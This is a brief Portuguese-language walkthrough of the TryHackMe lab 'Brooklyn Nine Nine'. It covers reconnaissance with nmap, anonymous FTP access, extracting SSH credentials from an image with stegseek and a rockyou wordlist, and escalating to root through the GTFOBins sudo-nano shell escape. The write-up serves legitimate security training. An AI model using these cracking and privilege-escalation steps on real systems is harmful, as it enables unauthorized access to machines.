Brooklyn Nine Nine

TryHackMe, Easy

Brooklyn Nine Nine combina uma dica em FTP anônimo, esteganografia para obter credenciais e escalação de privilégios abusando de sudo nano segundo o GTFOBins.

Reconhecimento

O Nmap revela FTP (login anônimo permitido), SSH e HTTP. Uma nota no FTP indica que o usuário jake tem senha fraca; a página web esconde uma imagem com dados via esteganografia.

nmap -sS -sV <IP>
nmap -sV --script ftp-anon -p 21 <IP>
ftp <IP>   # anonymous -> note_to_jake.txt

Foothold

O stegseek extrai a senha embutida na imagem do site, usada para autenticar como holt via SSH.

stegseek brooklyn99.jpg rockyou.txt
ssh holt@<IP>   # senha: <SENHA>

Escalação - sudo nano (GTFOBins)

O sudo -l mostra que holt pode executar o nano como root. Pelo GTFOBins, abre-se um shell a partir do editor.

sudo -l
sudo /bin/nano
^R^X
reset; sh 1>&0 2>&0
cat /root/root.txt
